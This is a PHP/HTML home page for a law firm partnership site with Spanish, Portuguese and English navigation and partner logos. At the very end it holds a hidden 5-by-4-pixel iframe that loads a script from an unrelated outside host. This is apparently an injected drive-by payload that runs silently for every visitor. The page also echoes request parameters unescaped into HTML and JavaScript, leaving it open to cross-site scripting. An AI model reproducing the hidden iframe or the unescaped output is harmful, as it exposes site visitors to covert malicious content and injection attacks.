<?
	define ('authenticate', false);
	require ('./inc/conf.inc.php');

	$socio=$_REQUEST['socio'];
	if(!isset($_REQUEST['socio'])) $socio='mdt';
	$_SESSION['socio']=$socio;
	$id_sel='';
	
	$lng=$_REQUEST['lng'];
	if(!isset($lng)){
		$lng='esp';
		$_SESSION['lng']=$lng;
	}
	
	$prefijo_socio['mdt']='munoz';
	$prefijo_socio['alv']='alvarez';
	$prefijo_socio['sou']='souza';
	
	$pie_socio['munoz']='mdt';
	$pie_socio['souza']='sou';
	$pie_socio['alvarez']='alv';

	$lenguaje['esp']='Español';	
	$lenguaje['por']='Portugues';	
	$lenguaje['ing']='English';
	
	$lateral[0]['esp']='Novedades';
	$lateral[0]['ing']='News';
	$lateral[0]['por']='Novidades';

	$lateral[1]['esp']='Sitios de interés';
	$lateral[1]['ing']='Links';
	$lateral[1]['por']='Sítios de Interesse';

	$lateral[2]['esp']='Oficinas';
	$lateral[2]['ing']='Offices';
	$lateral[2]['por']='Oficinas';
		
	$lateral[3]['esp']='Contacto';
	$lateral[3]['ing']='Contact';
	$lateral[3]['por']='Contato';
		

	$_SESSION['sociosel']=$prefijo_socio[$socio];
	
	if($_POST['id_sel']>0){

		if($_POST['id_sel']==1){
			$destino="./perfil.php?id_sel=".$id_sel."&lng=".$lng."&soc=".$prefijo_socio[$socio];
		}
		else{
			$destino="./carga_seccion.php?id_sel=".$id_sel."&lng=".$lng."&soc=".$prefijo_socio[$socio];
		}
	}
	else{	
		$destino=$prefijo_socio[$socio]."home.html";
	}
?>

<html>
<head>
<title>M S A</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="estilos<?=$socio?>.css" rel="stylesheet" type="text/css">
<script src="funciones.js" type="text/javascript" defer></script>
<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
<style type="text/css">

<!--
body {
	margin-left: 2px;
	margin-top: 2px;
	margin-right: 2px;
	margin-bottom: 2px;
}
  @font-face {
    font-family: Bliss-Regular;
    font-style:  normal;
    font-weight: normal;
    src: url(<?=CFG_virtualPath?>BLISSRE1.eot);
  }
  @font-face {
    font-family: Bliss-Regular;
    font-style:  normal;
    font-weight: 700;
    src: url(<?=CFG_virtualPath?>BLISSRE0.eot);
  }

-->
</style>
</head>

<div align="center">
	<table width="778" height="100%" border="0" cellpadding="0" cellspacing="0" class="bordeexterno">
		<!--DWLayoutTable-->
		<form name="form" method="post">
		<input type="hidden" name="socio" value="<?=$socio?>">
		<input type="hidden" name="lng" value="<?=$lng?>">
		<input type="hidden" name="id_sel" id="id_sel" value="<?=$id_sel?>">
		<tr>
			<td width="45" height="343" rowspan="3" valign="top">&nbsp;</td>
		    <td width="386" height="86"><a href="#" onClick="cambiasocio('<?=$socio?>')"><img src="images/logo<?=$prefijo_socio[$socio]?>1.gif" border="0"></a></td>
		    <td height="85">&nbsp;</td>
		    <td width="254"><img src="images/direccion<?=$prefijo_socio[$socio]?>.gif"></td>
		</tr>
		<tr>
			<td height="100%" colspan="3" valign="top">
				<table width="100%" height="100%"  border="0" cellpadding="0" cellspacing="0">
                	<tr>
                		<td width="7%" height="28" bgcolor="#666666" class="botonbuscar" scope="col" style="border-top:1px solid #ffffff ">&nbsp;</td>
                		<td width="93%" height="28" bgcolor="#999999" scope="col">
								<table width="100%" height="28" border="0" cellpadding="0" cellspacing="0" bgcolor="">
										<tr><td height="28" bgcolor="#666666" align="left">
											<span id="menues">
												<? //include("./tmp_menues/menu_".$socio.".php"); ?>
												<?  include("menuflash.php"); ?>
												<!--<script type='text/javascript' src='menu9_com.js'></script>-->
											</span>
										</td></tr>
								</table>
							</td>
               		</tr>
                	<tr>
                		<td class="bordederecho"><img src="images/tierra<?=$prefijo_socio[$socio]?>1.jpg"></td>
                		<td height="100%"  width="100%" rowspan="2" ></td>
           		</tr>
                	<tr class="fondo2">
                		<td height="100%" valign="top" bgcolor="#A5A5A5" class="bordederecho" >
                			<table width="100%"  border="0" cellspacing="0" cellpadding="0">
                  <tr> 
                    <td height="34" class="botonnovedades" scope="col"><a href="javascript:ir_a('novedades')" class="botonnovedades" style="text-decoration:none "><?=$lateral[0][$lng]?></a></td>
                  </tr>
                  <tr> 
                    <td height="34" class="botonnovedades"><a href="javascript:ir_a('links')" class="botonnovedades" style="text-decoration:none "><?=$lateral[1][$lng]?></a></td>
                  </tr>
                  <tr>
                    <td height="34" class="botonnovedades"><a href="javascript:ir_a('oficinas')" class="botonnovedades" style="text-decoration:none "><?=$lateral[2][$lng]?></a></td>
                  </tr>
                  <tr> 
                    <td height="34" class="botonnovedades"><a class="botonnovedades" href="mailto:info@mdtmdt.com"><?=$lateral[3][$lng]?></a></td>
                  </tr>
                </table>
                		</td>
               		</tr>
               	</table>
			</td>
		</tr>
		<tr>
			<td colspan="3" valign="top">
				<table width="100%" height="53"  border="0" cellpadding="0" cellspacing="0" class="lineainferior">
                	<tr>
                		<td width="7%" scope="col">
								<table width="100%" cellpadding="0" cellspacing="0" align="center">
								<?
									foreach($lenguaje as $a=>$b){
										if($a!=$lng){
								?>
									<tr>
										<td><img src="./images/circulito.gif" border="0"></td><td class='idioma' onMouseOver="this.className='idiomaover'" onMouseOut="this.className='idioma'" onClick="cambiaidioma('<?=$a?>')"><?=$lenguaje[$a]?></td>
									</tr>
								<?
										}
									}
								?>
								</table>
							
							</td>
                		<td width="100%" scope="col">&nbsp;</td>
<!-- agregado por www.domo.com.ar -->
								 <td width="24%" scope="col"><a href="http://www.scbf.com.br/"><img src="images/logosouza2.gif" border="0"></a></td>
						<?if ($lng=="esp"){?>
								 <td width="24%" scope="col"><a href="http://www.ahjc.cl/portada.php"><img src="images/logoalvarez2.gif" border="0"></a></td>
						<?}else {?>
								 <td width="24%" scope="col"><a href="http://www.ahjc.cl/eng/portada.php"><img src="images/logoalvarez2.gif" border="0"></a></td>
								 <?}?>

<!--							<?
							foreach($pie_socio as $a=>$b){
								if($b!=$socio){
							?>
               		 <td width="24%" scope="col"><a href="#" onclick="cambiasocio('<?=$pie_socio[$a]?>')"><img src="images/logo<?=$prefijo_socio[$b]?>2.gif" border="0"></a></td>
							<?
								}
							}
							?>-->
                	    <td width="6%" scope="col">&nbsp;</td>
                	    <td width="12%" scope="col"><img src="images/linea.gif" width="15" height="53"></td>
                	</tr>
               	</table>
			</td>
		</tr>
		</form>
	</table>
</div>

<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
